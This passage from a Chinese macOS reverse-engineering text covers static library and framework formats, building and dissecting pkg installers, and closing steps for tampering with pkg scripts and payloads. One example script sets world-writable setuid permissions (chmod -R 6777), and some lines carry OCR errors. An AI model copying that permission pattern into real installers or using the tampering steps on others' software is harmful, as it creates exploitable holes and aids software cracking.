上一节讲到的动态库文件格式就是标准的Mach-O文件。与Mach-O可执行文件不同的是，动态库在Mach-O头部指定文件类型为MH_DYLIB，可执行程序为MH_EXECUTE。而静态库文件不是标准的Mach-O文件，它的格式如下所示：

Start
Symtab Header
Symbol Table
String Table
Object Header 0
ObjName0.0
.....
Object Header N
ObjNameN.0

Start为静态库的开始，它是一个固定长度的签名值！<arch>\n，十六进制为213C617263683E OA。

Symtab Header为符号表头，描述了符号表的信息。它使用`symtab_header`结构体表示，具体定义如下：

struct symtab_header {
    char    name[16]; /* 名称 */
    char    timestamp[12]; /* 库创建的时间戳 */
    char    userid[6]; /* 用户id */
    char    groupid[char]; /* 组id */
    uint64_t    mode; /* 文件访问模式 */
    uint64_t    size; /* 符号表占总字节大小 */
    uint32_t    endheader; /* 头结束标志 */
    char    longname[20]; /* 符号表长名 */
};

Symbol Table为当前静态库导出的符号表。它使用symbol_table结构体表示，具体定义为：

struct symbol_table {
    uint32_t size; /* 符号表占用的总字节数 */
    symbol_info syminfo[0]; /* 符号信息，它的个数是 size / sizeof(symbol_info) */
};

struct symbol_info {
    uint32_t symnameoff; /* 符号名在字符串表数据中的偏移值 */
    uint32_t objheaderoff; /* 符号所属的目标文件的文件头在文件中的偏移值 */
};

String Table为字符串表，该结构体存储的字符串信息供符号表使用，使用string_table结构体表示，具体定义为：

struct string_table {
    uint32_t size; /* 字符串表占用的总字节数 */
    char data[size]; /* 字符串数据 */
};

Object Header为目标文件的头，描述了接下来的目标文件的信息，使用object_header结构体表示，具体定义为：

struct object_header {
    char     name[16]; /* 名称 */
    char     timestamp[12]; /* 目标文件创建的时间戳 */
    char     userid[6]; /* 用户id */
    char     groupid[char]; /* 组id */
    uint64_t     mode; /* 文件访问模式 */
    uint64_t     size; /* 符号表占总字节大小 */
    uint32_t     endheader; /* 头结束标志 */
    char     longname[20]; /* 符号表长名 */
};

object_header结构体的布局与symtab_header基本一样

在object_header结构体下面紧接着就是具体的目标文件内容了。目标文件是以.o结尾的Mach-O格式的文件，它是由编译器生成的中间文件。目标文件在它的Mach-O头部被标识为MH_OBJECT类型的文件。

最后，可以使用MachOView查看本节生成的libmystaticlib.a的结构信息，效果如图4-11所示。

 </div>

   </div>

#### 4.7.3 管理静态库

通过上一节的分析，我们知道，静态库是由一些头信息和一系列的。目标文件组成的。在分析静态库中的具体目标文件时，需要先将目标文件解压出来（目前主流的静态分析工具都支持直接读取静态库中的目标文件）。但如果想要修改静态库中目标文件的内容，就需要先将目标文件取出，修改后再替换回去。在了解了静态库文件格式后，完全可以自己动手写个工具解出静态库中的目标文件。但实现上不用这么麻烦，可以使用库管理工具ar来完成这项工作。

执行如下命令就可以解出上一节生成的静态库中的目标文件：

$ ar -x ./libmystaticlib.a

操作成功后没有输出信息，但可以发现，当前目录中已经生成了mystaticlib.o文件。在修改完目标文件后，可以将其打包进原来的库，或者直接生成新的静态库，执行以下命令：

$ ar rcs libmystaticlib_new.a *.o

同样没有输出信息，但ar已经将当前目录下所有的目标文件都成功打包进了libmystaticlib_new.a中。

### 4.8 框架

使用静态库与动态库固然方便，但无法解决引用外部库资源的问题，框架（framework）就是为了解决此问题而发明的。macOS系统大量地使用了框架技术。在System/Library/Frameworks目录下存放了系统为外部提供的框架，这些框架可以被外部应用程序调用。另外，System/Library/PrivateFrameworks目录里存放的是系统的私有框些，供系统专用。Frameworks目录下存放的公用框架，通常在macOS的开发文档中会找到框架的介绍与使用文档，而私有框架则没有，因为私有框架提供的接口往往不太稳定、经常变动，而且对于一些比较底层的功能，苹果也不愿意暴露给开发者，因此使用私有框架的程序是不允许在App Store中发布的。

系统每次更新都会对框架做不少改动，废弃低版本的框架或者增加新的框架是常有的事，比如在macOS 10.11版本中增加了如下框架。

☐ Contacts.framework：联系人框架。使用现在面向对象的访问方式替换以前的地址簿框架。

□ GameplayKit.framework: GameplayKit游戏框架。提供了构建游戏的基础技术，开发者可以使用GameplayKit框架，配合高级图像引擎SceneKit与SpriteKit，来开发完整的商业化游戏。

☐ Metal.framework：Metal框架提供了基于GPU的3D图形渲染与分布式数据计算的接口，作用与OpenGL类似。

☐ MetalKit.framework: MetalKit框架包含了创建Metal程序的类与函数。

☐ ModellO.framework: Model I/O框架提供了系统层面的3D模型与相关资源的解释功能接口。

□ NetworkExtension.framework：网络扩展接口。用于配置与管理VPN。

安装了macOS的开发SDK后，SDK目录中会有一个框架目录，里面存放的是文档化的框架，可以直接用于程序开发。查看系统安装的SDK的路径可以执行如下命令：

$ x_{crun} --sdk macosx --show-sdk-path
/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.12.sdk

在SDK目录下，框架的目录为$(SDK_PATH)/System/Library/Frameworks，私有框架的目录为$(SDK_PATH)/System/Library/PrivateFrameworks。这些目录下的框架并不是真正的框架，只是指向系统框架的一个“索引框架”。拿Contacts.framework来说，该框架中有一个Headers目录，存放着框架暴露出去的接口的头文件，此目录在系统框架目录中是不存在的。另外，开发者自己创建的框架通常会包含此目录。Contacts.framework中有一个Contacts.tbd文件，它包含了该框架的一些信息，如下所示：

archs: [ x86_64 ]
platform: macosx
install-name: /System/Library/Frameworks/Contacts.framework/Versions/A/Contacts
current-version: 0.0
compatibility-version: 0.0
exports:
- archs: [ x86_64 ]
  symbols: [ _CNActivityAlertCallActivityKey, _CNActivityAlertSoundKey,
                                  CNSocialProfileUsernameKey, _CNTelephonyServiceName,
                                  CNWorkLabel ]
  objc-classes: [ _CNAccount, _CNActivityAlert, _CNCDContactFetcher,
                                  CNPredicate, _CNPredicateValidator, _CNSaveRequest,
                                  CNSocialProfile, _CNSuggestedSaveRequest, _CNTCC ]
  objc-ivars: [ _CNCDContactFetcher, _fetchRequestDescription, _CNCDContactFetcher,
                                  persistenceContext,
                                  CNPostalAddress, _subAdministrativeArea ]

archs指明了框架支持的CPU架构，Contacts框架只支持x86_64，如果支持多个架构，会在此处列出来；platform指明了框架运行的系统平台；install-name指明了框架的路径，这才是框架的真正所在；current-version与compatibility-version指明了当前版本号与兼容版本号；symbols是框架向外提供的符号列表。objc-classes与objc-ivars提供了Objc类与变量。

#### 4.8.1 构建框架

Xcode提供了构建框架的工程模板，方法与创建静态库和动态库一样，在选择项目模板时，选择Cocoa Framework，然后点击Next输入项目的名称即可。开发框架可以使用Swift或Objective-C语言，项目创建完成后，默认生成myframework.h头文件，它的代码如下：

#import <Cocoa/Cocoa.h>

FOUNDATION_EXPORT double myframeworkVersionNumber;

FOUNDATION_EXPORT const unsigned char myframeworkVersionString[];

将4.6节mylib项目的mylib.h与mylib.m文件添加到项目中，然后选择myframework项目，在Build Phases标签页中，展开Headers一项，将mylib.h设置为Public，如图4-12所示。

 </div>

接着在myframework.h中添加一行代码：#import "mylib.h"。

以后每次添加接口，都可以将头文件添加到myframework.h中。使用框架时，只需要包括myframework.h到项目中就可以了。以上操作完成后，点击Xcode菜单Product→Build，或者按键盘的command+B就会成功生成框架。

使用Swift创建框架的方法相同。Swift创建框架如果是给Swift调用，通常不需要导出头文件，只需要将类与方法都设置成public即可，编译器编译成功后会自动生成头文件。详见本节演示程序myframeworkswift代码。

#### 4.8.2 框架的使用与安装

生成的框架可以直接拿来供程序使用，创建新的Cocoa Application工程myframeworktest，将上一节生成的myframework.framework直接拖入到项目中，会弹出如图4-13所示的对话框。

勾选“Copy items if needed”选项后，点击Finish完成框架的导入。接着选中“myframeworktest”项目，在General的“Embedded Binaries”选项中点击加号“+”，将myframework.framework导入。

 </div>

框架导入完成后，为myframeworktest添加框架导入语句#import "myframework/myframework.h"，然后在applicationDidFinishLaunching()方法中添加如下代码：

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
    mylib* l = [[mylib alloc] init];
    [l hello];
}

保存代码后，点击Xcode界面上的运行按钮直接编译运行程序，成功的话就会在输出窗口输出“hello world”。

Swift版本的框架使用方法相同，此处不再展开，详见本节演示程序myframeworkswifttest的代码。

框架可以供自己单独使用，最终会嵌入到App程序包中，也可以安装到系统中，供其他程序使用。macOS系统允许开发人员将框架安装到~/Library/Frameworks目录下，以便第三方程序调用。以下是安装了三星公司的Smart Switch程序后在系统中安装的框架。

$ ls -l ~/Library/Frameworks/
total 0
drwxr-xr-x 7 ... May 3 18:55 SamsungKiesFoundation.framework
drwxr-xr-x 6 ... Mar 6 06:02 SamsungKiesSerialPort.framework

### 4.9 pkg

不同的操作系统有专属的软件安装包格式。如Ubuntu系统上的deb安装包、Windows系统上的msi安装包等。macOS系统使用pkg作为软件安装包格式。

macOS上开发的大多数程序都不需要安装，它们是以.app结尾的Bundle包。通常以zip压缩包或者dmg镜像的方式进行发布。然而，一些App可能有特定的需求，比如，向系统配置面板写配置程序、安装屏幕保护程序、读写特定的目录与文件等。对于这些特殊的程序，就可以通过制作pkg安装程序来安装。当然，由于这些特殊性，pkg安装程序无法通过苹果官方商店来发布。

#### 4.9.1 构建 pkg

pkg安装程序能够扩展程序安装内容以及读写特定目录的特性。来源于pkg支持的脚本特性，pkg安装程序允许开发人员在程序安装过程中，运行自己编写的Bash脚本程序。

苹果官方在低版本的Xcode工具中提供了用来制作pkg的PackageMaker。该工具没有直接包含在Xcode开发套件中，需要到苹果的开发者官网上下载。下载安装好该工具后，运行PackageMaker.app就可以制作pkg了。

本节将制作一个pkg安装包，完成以下目标：将上一节的myframeworktest程序安装到Applications目录下，将myframework.framework框架安装到~/Library/frameworks目录中。启动PackageMaker，点击菜单File→New，在弹出的对话框中，在Organization一栏输入机构信息，如“com.macbook”，点击OK返回程序主界面，点击File→Save，将工程保存为pkg_install.pmdoc。

将上一节的myframeworktest程序放到app目录下，并将app目录拖入PackageMaker的主界面，会自动为程序添加配置信息。点击Configuration可以设置一些安装时的配置信息，如图4-14所示。

 </div>

install指定要安装的程序路径，这里已经指定好了；Destination指定程序要安装的位置，默认为/Applications目录；取消勾选“Allow custom location”选项，让程序只能安装到/Applications目录下；Package Identifier指定安装包的标识符，macOS记录安装过的pkg就是通过它来识别的，手动卸载pkg时需要用到它；Package Version指定安装包的版本，版本号是识别pkg版本升级的关键，为pkg指定升级脚本时需要用到；Restart Action指定pkg安装完成后，是否需要执行注销、关机或重启等操作；Require admin authentication复选框指定安装器需要管理员权限，如果为pkg指定的安装脚本需要管理员权限，就需要在此勾选上。

接下来，点击Contents标签，配置需要安装的内容。PackageMaker已经默认选择好了要安装的内容为myframeworktest.app，并且文件的读写与执行权限也自动设置好了，如图4-15所示。

 </div>

关于文件的读写权限，一个建议的设置如表4-1所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>Owner</td><td style='text-align: center; word-wrap: break-word;'>Group</td><td style='text-align: center; word-wrap: break-word;'>Permissions</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Applications</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>admin</td><td style='text-align: center; word-wrap: break-word;'>TWXRWXI-X</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>System</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>admin</td><td style='text-align: center; word-wrap: break-word;'>RWXRWXI-X</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Library</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>admin</td><td style='text-align: center; word-wrap: break-word;'>RWXRWXI-X</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Extensions</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>admin</td><td style='text-align: center; word-wrap: break-word;'>RWXRWXI-X</td></tr></table>

对于拖入Contents中的程序，macOS系统会在操作过的文件夹中生成一个隐藏的.DS_Store文件。如果系统开启了显示隐藏文件的选项，那么直接打包程序会在安装包中包含隐藏的.DS_Store文件。因此，在拖入Contents前需要将它们全部删除，使用如下命令即可：

find ./ -name ".DS_Store" -exec rm -f {} \;

点击Components标签，配置组件信息。取消“Allow Relocation”复选框，否则即使提示安装完成，在/Applications目录下也看不到安装后的程序，如图4-16所示。

 </div>

点击Scripts标签，配置运行安装器时需要执行的脚本。将编写好的脚本分别保存为preflight与postflight，然后将它们放到script目录下，执行以下命令为它们赋予可执行权限：

将script目录直接拖入Scripts Directory旁的文本框中，此时，Preflight与Postflight脚本会自动设置完成，如图4-17所示。

 </div>

可以设置的脚本有6个，下面按照它们的执行顺序一一介绍。

□ preflight: 点击安装界面上的Install按钮时运行此脚本。该脚本在程序每次安装时都会运行。

preinstall/preupgrade：针对单程序安装包，该脚本会在preflight脚本运行之后运行；针对多程序安装包，该脚本会在用户按下Install按钮后执行。preinstall与preupgrade的区别在于，preinstall只会在用户第一次安装该程序时执行，而preupgrade相反，只有之前安装过该程序，该脚本才会执行，因此，preupgrade常在软件升级时使用。区分程序是否为第一次安装是通过pkg安装器Installer.app完成的，Installer.app通过查看/private/var/db/receipts目录中是否有以程序包名命名的pkg文件，如果存在，说明已经安装过，否则为第一次安装。

☐ postinstall/postupgrade；该脚本在程序安装完之后才运行。它们的区别与preinstall/preupgrade一样。

☐ postflight: 该脚本在postinstall/postupgrade脚本之后运行。

PackageMaker支持Shell脚本与Perl脚本，此处编写的是Shell脚本，preinstall脚本的内容如下：

##!/usr/bin/env bash

echo "Running my framework test.app preinstall script."

   </div>

echo "Killing my framework test.app."
killall "my framework test"

echo "Finding old versions of my framework test."
mdfind -onlyin /Applications "kMDItemCFBundleIdentifier='fc.myframeworktest'" | xargs -I % rm -rf %

echo "Removed old versions of my framework test.app, if any."
echo "Ran my framework test.app preinstall script."

exit 0

这段脚本首先使用killall杀掉正在运行的myframeworktest.app进程，接着使用mdfind在/Applications目录下查找程序标识符为"fc.myframeworktest"的程序包路径，找到后使用rm -rf将其删除。

再来看看postflight脚本的内容：

#!/usr/bin/env bash

echo "Running myframeworktest.app postinstall script."
echo "Installing myframework.framework."

rm -rf ~/Library/Frameworks/myframework.framework
mkdir ~/Library/Frameworks/myframework.framework
cp -r /Applications/myframeworktest.app/Contents/Frameworks/myframework.framework/*
~/Library/Frameworks/myframework.framework

chmod -R 6777 ~/Library/Frameworks/myframework.framework
echo "Ran myframeworktest.app postinstall script."

exit 0

在该脚本运行时，myframeworktest.app程序包已经安装到了/Applications目录下，将myframework.framework复制到~/Library/Frameworks目录下，然后修改它的权限为任何人都可读可写可执行，执行完后调用exit 0退出脚本。

配置好要安装的内容与执行脚本后，点击 Contents 上面的图标，对 pkg 进行配置。点击 Configuration，在 Title 旁的文本框中输入安装包的标题，例如 “mframework test installer”；在 User Sees 处选择 Easy Install Only（简单安装）即可；在 Install Destination 处勾选 Volume selected by user。

点击Requirements标签，设置pkg运行的系统要求。点击界面左下角的加号”+“按钮，添加两条规则：一条是System OS Version(e.g. 10.x.x)，另一条是Target OS Version(e.g. 10.x.x)，都设置成>=10.6，如图4-18所示。

 </div>

最后的Actions标签页不用管。配置完了后，点击界面右上角的Edit interface按钮，编辑安装程序的界面，包括：Background、Introduction、Read me、License与Finish up。每一项都是一个页面，内容可以选择系统默认的Default，也可以直接写一段文本嵌入进去，或者选择一个外部的rtf文档或html网页。图4-19所示为一段手写的Read Me。

 </div>

   </div>

以上所有操作完成后，点击PackageMaker左上角的Build按钮进行构建，或者点击Build and Run按钮构建成功后直接运行。构建完成后会针对单程序安装包或多程序安装包生成一个pkg或mpkg文件，该文件是可以发布的产品，接下来只需要对其进行安装测试，没问题就可以发布了。

新版本的Xcode提供了命令行工具productbuild来打包制作pkg。本节PackageMaker操作的步骤可以通过执行以下命令完成：

$ productbuild --component app/myframeworktest.app /Applications --scripts script ~/Desktop/out.pkg

命令执行完后，就会在当前用户桌面上生成pkg文件，当然编译时可以指定--sign参数来为pkg签名。但pkg签名不使用codesign，如果创建pkg时没有对其进行签名，或者手动修改过pkg的内容，可以使用工具productsign来对pkg进行签名。

介绍了官方的pkg创建工具后，下面再来看看目前市面上常用的pkg制作工具。喜欢命令行编译的开发人员一定会喜欢工具Luggage $ ^{①} $，它提供了一种自定义脚本的方式来编译构建pkg文件。该工具的使用方法很简单，只需要将GitHub上的文件复制到/usr/local/share/luggage就完成了安装。至于脚本如何编写，可以参考Luggage提供的样例 $ ^{②} $。以编译样例中的fex程序为例，在命令行下执行以下命令：

$ make

Usage

make clean - clean up work files.

make dmg - roll a pkg, then stuff it into a dmg file.

make zip - roll a pkg, then stuff it into a zip file.

make pkg - roll a pkg.

make pkgls - list the bill of materials that will be generated by the pkg.

$ make pkg

Password:

make -f Makefile -e pack-fex

Disabling bundle relocation.

If you need to override permissions or ownerships, override modify_packageroot in your Makefile Creating /tmp/the_luggage/Fex-20160902/payload/Fex-20160902.pkg with /usr/bin/pkgbuild.

sudo /usr/bin/pkgbuild --root /tmp/the_luggage/Fex-20160902/root \
--component-plist /tmp/the_luggage/Fex-20160902/luggage.pkg.component.plist \
--identifier com.huronhs.Fex \
--filter "/CVS$" --filter "/\.svn$" --filter "/\.cvsignore$" --filter "/\.cvspass$"
--filter "/\._\?"\.DS\_Store$" --filter "/\.git$" --filter "/\.gitignore$" \
--scripts /tmp/the_luggage/Fex-20160902/scripts \
--version 20160902 \
--ownership preserve --quiet \
/tmp/the_luggage/Fex-20160902/payload/Fex-20160902.pkg

$ ls
Fex-20160902.pkg
Makefile
fex

从输出中可以看出，除了构建pkg，Luggage还支持生成dmg与zip打包的程序，非常方便。

与Luggage类似的还有createOSXInstallPkg $ ^{①} $，使用方法也很简单，有兴趣的读者可以到GitHub上查看如何使用。

最后，还有一款强大且免费的pkg安装包制作工具Iceberg $ ^{②} $，该工具可以修改安装程序界面的背景图片。此处就不具体讨论它的用法了，有兴趣的读者可以去官网下载试用。

#### 4.9.2 pkg 的安装与卸载

安装pkg很简单，只要双击pkg，或者双击mpkg，就会弹出安装向导，按照步骤不停点击Next，直到安装完成。在安装过程中，执行一些操作可能需要管理器权限，系统会弹出提示，要求用户输入管理员密码，按照操作输入密码即可。除了双击安装外，还可以使用命令行工具installer进行静默安装。执行以下命令可以安装上一节的pkg：

$ sudo installer -pkg ./myframework_installer.pkg -target LocalSystem Password:

installer: Package name is myframework installer

installer: Upgrading at base path /

installer: The upgrade was successful.

pkg的卸载就没这么简单了！苹果公司没有提供直接卸载pkg的方法。上一节我们没有制作pkg格式的卸载程序，而是编写了一个简单的脚本，只需要双击运行它就可以卸载上一节制作的pkg了。脚本的代码如下：

#!/usr/bin/env bash
if [ -d ~/Library/Frameworks/myframework.framework ]; then
    /bin/rm -rf ~/Library/Frameworks/myframework.framework
fi
if [ -d /Application/myframework.app ]; then
    /bin/rm -rf /Applications/myframeworktest.app
fi
echo done.

对于没有提供卸载程序的pkg，就只能手动卸载，或者使用第三方工具，例如UninstallPKG $ ^{③} $，这是一款收费软件，安装运行后，它会收集系统中安装的所有pkg软件，然后以列表形式展示出来，如图4-20所示。

78 Packages 8625.0 MB

 </div>

点击 View Package...按钮，可以查看pkg在系统中写入了哪些文件内容，点击 Uninstall Package...，可以直接卸载pkg。

UninstallPKG是如何收集与卸载系统中安装的pkg的呢？其实原理很简单。它读取/private/var/db/receipts下的pkg列表，然后使用Isbom查看这些pkg文件的bom信息。找到bom文件中保存的文件列表，将它们列举出来，卸载的时候将它们全部删除即可。执行如下命令列表就可以查看上一节pkg的信息：

$ cd /private/var/db/receipts
$ ls | grep macbook
com.macbook.myframeworkInstaller.pkg.bom
com.macbook.myframeworkInstaller.pkg.plist
$ lsbom -pf ./com.macbook.myframeworkInstaller.pkg.bom
.myframeworktest.app
.myframeworktest.app/Contents
.myframeworktest.app/Contents/Frameworks
.myframeworktest.app/Contents/Frameworks/myframework.framework
.myframeworktest.app/Contents/Frameworks/myframework.framework/Resources
.myframeworktest.app/Contents/Frameworks/myframework.framework/Versions
.myframeworktest.app/Contents/Frameworks/myframework.framework/Versions/A
.myframeworktest.app/Contents/Frameworks/myframework.framework/Versions/A/Resources
.myframeworktest.app/Contents/Frameworks/myframework.framework/Versions/A/Resources/Info.plist
.myframeworktest.app/Contents/Frameworks/myframework.framework/Versions/A/CodeSignature
.myframeworktest.app/Contents/Frameworks/myframework.framework/Versions/A/CodeSignature/CodeResources
.myframeworktest.app/Contents/Frameworks/myframework.framework/Versions/A/myframework
.myframeworktest.app/Contents/Frameworks/myframework.framework/Versions/Current

./myframeworktest.app/Contents/Frameworks/myframework.framework/myframework
./myframeworktest.app/Contents/Info.plist
./myframeworktest.app/Contents/MacOS
./myframeworktest.app/Contents/MacOS/myframeworktest
./myframeworktest.app/Contents/PkgInfo
./myframeworktest.app/Contents/Resources
./myframeworktest.app/Contents/Resources/Base.lproj
./myframeworktest.app/Contents/Resources/Base.lproj/MainMenu.nib
./myframeworktest.app/Contents/_CodeSignature
./myframeworktest.app/Contents/_CodeSignature/CodeResources

观察脚本中执行的命令，可以看出，在~/Library/Frameworks目录中安装的myframework.framework并没有列出来，而只有在Contents中指定的内容。上面查看bom信息使用的是lsbom命令，其实，查看pkg中的内容还有一种更简单的方法：双击运行pkg后，不要点击Continue按钮，而是点击菜单File→Show Files，pkg中包含的文件内容就一目了然了，如图4-21所示。

 </div>

除了到/private/var/db/receipts目录手动读取pkg列表, 还可以使用pkg管理工具pkgutil来查看系统中安装的pkg信息, 不过只有查看功能, 不能卸载。执行如下命令可以查看上一节安装的pkg信息, 效果与上面一样:

$ pkgutil --pkgs | grep -i com.macbook
com.macbook.myframeworkInstaller.pkg
$ pkgutil --files com.macbook.myframeworkInstaller.pkg
myframeworktest.app
myframeworktest.app/Contents
myframeworktest.app/Contents/Frameworks
myframeworktest.app/Contents/Frameworks/myframework.framework

   </div>

myframeworktest.app/Contents/Frameworks/myframework.framework/Resources
myframeworktest.app/Contents/Frameworks/myframework.framework/Versions
myframeworktest.app/Contents/Frameworks/myframework.framework/Versions/A
myframeworktest.app/Contents/Frameworks/myframework.framework/Versions/A/Resources/Info.plist
myframeworktest.app/Contents/Frameworks/myframework.framework/Versions/A/CodeSignature
myframeworktest.app/Contents/Frameworks/myframework.framework/Versions/A/CodeSignature/CodeResources
myframeworktest.app/Contents/Frameworks/myframework.framework/Versions/A/myframework
myframeworktest.app/Contents/Frameworks/myframework.framework/Versions/Current
myframeworktest.app/Contents/Frameworks/myframework.framework/myframework
myframeworktest.app/Contents/Info.plist
myframeworktest.app/Contents/MacOS
myframeworktest.app/Contents/MacOS/myframeworktest
myframeworktest.app/Contents/PkgInfo
myframeworktest.app/Contents/Resources
myframeworktest.app/Contents/Resources/Base.lproj
myframeworktest.app/Contents/Resources/Base.lproj/MainMenu.nib
myframeworktest.app/Contents/_CodeSignature/CodeResources

#### 4.9.3 pkg 文件格式

pkg分为pkg与mpkg，前者是针对单程序安装，后者是针对多程序安装，它包含一个或多个子包（sub package）。pkg本身又有两种格式：一种与Bundle一样，有着特定组织结构的目录，上一节生成的pkg的安装包就是这种格式；还有一种是xar格式的文件。下面分别对这两种格式的安装包进行分析。

百先看myframework_installer.mpkg，使用tree命令（系统默认没有此命令，可以使用brew install tree进行安装）查看它的目录结构，如下所示：

对于外层的mpkg，它的Packages目录下存放的是pkg文件列表，也就是子包列表；Resources目录存放了pkg用到的资源，如本地化资源、图像、rtf文档、pdf文档等；distribution.dist文件是一个xml文档，包含了要安装的子包、运行时脚本等信息。对于当前的mpkg，它的内容如下所示：

<?xml version="1.0" encoding="utf-8" standalone="no"?>
<installer-script minSpecVersion="1.000000" authoringTool="com.apple.PackageMaker" authoringToolVersion="3.0.6" authoringToolBuild="201">
<title>myframework installer</title>
<options customize="never" allow-external-scripts="no" rootVolumeOnly="false"/>
<installation-check script="pm_install_check();"/>
<volume-check script="pm_volume_check();"/>
<script>
function pm_volume_check() {
    if(!(my.target.systemVersion &amp; &amp; / * &gt; = * /
        system.compareVersions(my.target.systemVersion.ProductVersion, '10.6') &gt; = 0)) {
        my.result.title = 'Failure';
        my.result.message = 'Installation cannot proceed, as not all requirements were met.';
        my.result.type = 'Fatal';
        return false;
    }
    return true;
}

function pm_install_check() {
    if(!(* &gt; = * / system.compareVersions(system.version.ProductVersion, '10.6') &gt; = 0)) {
        my.result.title = 'Failure';
        my.result.message = 'Installation cannot proceed, as not all requirements were met.';
        my.result.type = 'Fatal';
        return false;
    }
    return true;
}

</script>
<choices-outline>
    <line choice="choice0"/>
    </choices-outline>
    <choice id="choice0" title="app">
        <pkg-ref id="com.macbook.myframeworkInstaller.pkg"/>
        </choice>
    <pkg-ref id="com.macbook.myframeworkInstaller.pkg" installKBytes="108" version="1.0" auth="Root">file:./Contents/Packages/app.pkg</pkg-ref>
</installer-script>

pm_install_check()与pm_volume_check()分别做安装时检查与卷标检查，下面的choices-outline部分指定了安装时使用的choice，也就是选择执行哪个子包。对于当前的mpkg包，它只有一个pkg，choice的id为choice0，指向的路径是file://Contents/Packages/app.pkg。

app.pkg是要安装的子包，是一个pkg格式的Bundle结构的目录，它包含一个Contents子目录，里面有4个文件与1个目录Resources，下面分别进行介绍。

□ Archive.bom: bom信息。存放的是要安装写入的文件列表，可以使用lsbom -pf命令查看，效果与上一节讲到的一样。

□ Archive.pax.gz：使用pax格式打包后再使用gzip压缩的压缩包，它的内容就是要安装的内容，此处就是myframeworktest.app程序。可以执行以下命令进行解压：

$ cd ./myframework_installer.mpkg/Contents/Packages/app.pkg/Contents/
$ gunzip -d ./Archive.pax.gz
$ pax -rvf ./Archive.pax

./myframeworktest.app
./myframeworktest.app/Contents/CodeSignature
./myframeworktest.app/Contents/_CodeSignature/CodeResources
./myframeworktest.app/Contents/Frameworks
./myframeworktest.app/Contents/Frameworks/myframework.framework
./myframeworktest.app/Contents/Frameworks/myframework.framework/myframework
./myframeworktest.app/Contents/Frameworks/myframework.framework/Resources
./myframeworktest.app/Contents/Frameworks/myframework.framework/Versions
./myframeworktest.app/Contents/Frameworks/myframework.framework/Versions/A
./myframeworktest.app/Contents/Frameworks/myframework.framework/Versions/A/_CodeSignature
./myframeworktest.app/Contents/Frameworks/myframework.framework/Versions/A/_CodeSignature
/CodeResources
./myframeworktest.app/Contents/Frameworks/myframework.framework/Versions/A/myframework
./myframeworktest.app/Contents/Frameworks/myframework.framework/Versions/A/Resources
./myframeworktest.app/Contents/Frameworks/myframework.framework/Versions/A/Resources/Info.plist
./myframeworktest.app/Contents/Frameworks/myframework.framework/Versions/Current
./myframeworktest.app/Contents/Info.plist
./myframeworktest.app/Contents/MacOS
./myframeworktest.app/Contents/MacOS/myframeworktest
./myframeworktest.app/Contents/PkgInfo
./myframeworktest.app/Contents/Resources
./myframeworktest.app/Contents/Resources/Base.lproj
./myframeworktest.app/Contents/Resources/Base.lproj/MainMenu.nib

口 Info.plist: pkg包的信息。CFBundleIdentifier为pkg的标识；IFMajorVersion与IFMinorVersion分别为pkg的主版本与子版本号；IFPkgFlagInstalledSize为pkg安装后所需要占用的字节大小。

□ PkgInfo：8字节的标识。表明是一个pkg文件。

Resources目录除了包含资源文件外，还包含了以下文件。

□ package_version；包版本文件。即使用PackageMaker制作pkg时设置的版本号。

☐ postflight/preflight: pkg要执行的脚本文件。上一节中讲过，此处是未经过加密明文存放的。

□ 另外一种是xar格式的文件，可以使用如下命令查看myframework_installer.pkg文件的格式：

$ file ./myframework_installer.pkg
./myframework_installer.pkg: xar archive - version 1

□ xar是压缩的可扩展归档格式，可以使用xar命令对其进行解压，如下所示：

$ xar -xvf ./myframework_installer.pkg
Distribution
app.pkg/PackageInfo
app.pkg/Bom
app.pkg/Payload
app.pkg/Scripts
app.pkg
Resources/en.lproj
Resources

Distribution与前面讨论的distribution.dist文件基本一样，Resources目录也与前面的一样，下面我们主要看app.pkg，它包含以下4个文件。

□ Bom: bom信息，存放要安装写入的文件列表。可以使用 $ \underline{\text{lsbom -pf命令查看，效果与上一节讲到的一样。}} $

□ PackageInfo：文本文件，包含了包的信息。可以使用cat命令查看它的内容：

$ cat app.pkg/PackageInfo

<pkg-info format-version="2" identifier="com.macbook.myframeworkInstaller.pkg" version="1.0" install-location="/Applications" auth="root">
<payload installKBytes="108" numberOfFiles="25"/>
<scripts>
<preinstall file="/preflight"/>
<postinstall file="/postflight"/>
</scripts>
<bundle id="fc.myframeworktest" CFBundleIdentifier="fc.myframeworktest" path="/myframeworktest.app" CFBundleVersion="1">
<bundle id="fc.myframework" CFBundleIdentifier="fc.myframework" path="/Contents/Frameworks/myframework.framework" CFBundleVersion="1"/>
</bundle>
<bundle-version>
<bundle id="fc.myframeworktest"/>
<bundle id="fc.myframework"/>
</bundle-version>

□ Payload: 经过gzip压缩过的数据内容，本处为要安装的myframework.app，可以使用如下命令进行解压。解压成功后会在当前目录下生成myframework.app。

$ cat ./Payload | cpio -i
3 blocks

□ Scripts：经过gzip压缩的脚本。可以使用如下命令进行解压。解压成功后会在当前目录下生成未加密的preflight与postflight脚本。

$ cd app.pkg
$ cat ./Scripts | cpio -i
181 blocks

#### 4.9.4 破解 pkg

对pkg格式有一定了解后，修改或破解pkg就不难了。破解pkg无非有以下3种情况。

□ 资源的替换或修改：针对文件夹类型的pkg，未加密，可直接进行修改替换；针对xar类型的pkg，需要先解压xar，然后替换或修改完资源后，重新压缩xar。

口安装脚本的替换或修改：针对文件夹类型的pkg，未加密，可直接进行修改替换；针对xar类型的pkg，需要先解压xar，再解压Scripts，然后替换或修改完脚本后，重新压缩Scripts，最后重新压缩xar。

口安装内容的替换或修改：针对文件夹类型的pkg，未加密，但需要先对Archive.pax.gz进行解包，修改完后，需要重新打包回去；针对xar类型的pkg，需要先解压xar，然后解压Payload，替换或修改完数据后，重新压缩Payload，最后重新压缩xar。

